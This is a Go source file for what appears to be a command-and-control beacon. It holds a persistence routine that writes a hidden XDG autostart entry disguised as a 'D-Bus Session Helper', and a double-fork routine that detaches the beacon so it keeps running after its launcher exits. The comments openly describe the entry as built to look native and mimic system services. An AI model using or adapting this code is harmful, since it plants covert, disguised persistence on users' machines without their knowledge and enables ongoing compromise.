//go:build linux

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

// ── User-Level Persistence (No Root / No sudo) ─────────────
// Uses XDG autostart: ~/.config/autostart/<name>.desktop
// This is the standard freedesktop mechanism for launching user
// applications on login. No root required. No prompts.
// Works on GNOME, KDE, XFCE, Hyprland (if xdg-desktop-portal is running),
// and any DE that respects the XDG autostart spec.

const desktopEntryName = "dbus-helper.desktop"

func EnsurePersistence() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	exePath, _ = filepath.Abs(exePath)

	// XDG autostart directory
	autostartDir := filepath.Join(os.Getenv("HOME"), ".config", "autostart")
	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
		debugLog.Printf("%s persist: mkdir failed: %v", logPrefix, err)
		return
	}

	desktopPath := filepath.Join(autostartDir, desktopEntryName)

	// Check if already registered with correct path
	if existing, err := os.ReadFile(desktopPath); err == nil {
		if containsExec(string(existing), exePath) {
			return // already persisted
		}
	}

	// Build a .desktop entry that looks completely native.
	// Name and comment mimic D-Bus/system helper services.
	entry := fmt.Sprintf(`[Desktop Entry]
Type=Application
Name=D-Bus Session Helper
Comment=System message bus session daemon
Exec="%s" -quiet
X-GNOME-Autostart-enabled=true
Hidden=false
NoDisplay=true
Terminal=false
`, exePath)

	if err := os.WriteFile(desktopPath, []byte(entry), 0o644); err != nil {
		debugLog.Printf("%s persist: write failed: %v", logPrefix, err)
		return
	}

	debugLog.Printf("%s persistence registered (%s)", logPrefix, desktopPath)
}

// DetachFromParent performs a Unix double-fork to fully detach from Sable.
// After this call:
//   - The beacon is no longer a child of Sable
//   - It has its own session (setsid)
//   - stdin/stdout/stderr are closed (no terminal)
//   - When Sable exits, the beacon keeps running
//
// This is the classic Unix daemonization pattern.
func DetachFromParent() {
	// If launched with -quiet, we're already the detached child.
	// Don't fork again — infinite loop prevention.
	if quiet {
		return
	}

	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// Build args for the detached child
	args := []string{"-quiet"}
	if bridgeURL != "" {
		args = append(args, "-bridge", bridgeURL)
	}
	if sablePort != 8765 {
		args = append(args, "-sable-port", fmt.Sprintf("%d", sablePort))
	}
	if localPort != 18923 {
		args = append(args, "-local-port", fmt.Sprintf("%d", localPort))
	}
	if persistDir != "" && persistDir != "system" {
		args = append(args, "-persist-dir", persistDir)
	}

	cmd := exec.Command(exePath, args...)

	// Critical: create a new session so the child is fully independent
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true, // setsid() — new session, no controlling terminal
	}

	// Close all file descriptors from parent
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		debugLog.Printf("persist: %s: %v", logPrefix, err)
		return
	}

	// Release the child process — don't wait for it
	cmd.Process.Release()

	debugLog.Printf("%s detached child spawned (PID %d), parent exiting", logPrefix, cmd.Process.Pid)

	// Exit the Sable-launched parent cleanly.
	// The detached child continues as an independent background process.
	os.Exit(0)
}

func IsRunningAsService() bool {
	return quiet
}

// containsExec checks if a .desktop file's Exec line references our binary
func containsExec(content, exePath string) bool {
	return len(content) > 0 &&
		len(exePath) > 0 &&
		containsString(content, exePath)
}

func containsString(s, substr string) bool {
	return len(s) >= len(substr) && searchString(s, substr)
}

func searchString(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
